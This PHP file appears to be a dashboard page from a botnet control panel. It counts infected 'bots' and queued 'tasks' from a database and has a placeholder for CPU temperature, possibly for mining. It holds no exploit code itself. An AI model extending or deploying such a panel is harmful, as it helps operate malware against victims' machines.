<?php 

$path = $_SERVER['DOCUMENT_ROOT'];
$path .= "/panel 2/_conf/inc/connection.class.php";

@require $path;



$bots1 = $dbh->prepare("SELECT * FROM reports");
$bots1->execute();
$bots2 = $bots1->rowCount();

$tasks1 = $dbh->prepare("SELECT * FROM tasks");
$tasks1->execute();
$tasks2 = $tasks1->rowCount();

if(!$user->is_loggedin())
{
 $user->redirect('login');
}

?>

<div class="container">
<h2>Useful information</h2>
		<ul>
		<li><b>Amount Of bots:</b> <?php echo $bots2; ?>
		<li><b>Amount Of tasks:</b> <?php echo $tasks2; ?></li>
		<li><b>Average CPU Temp:</b> ?  </li>
		
</div>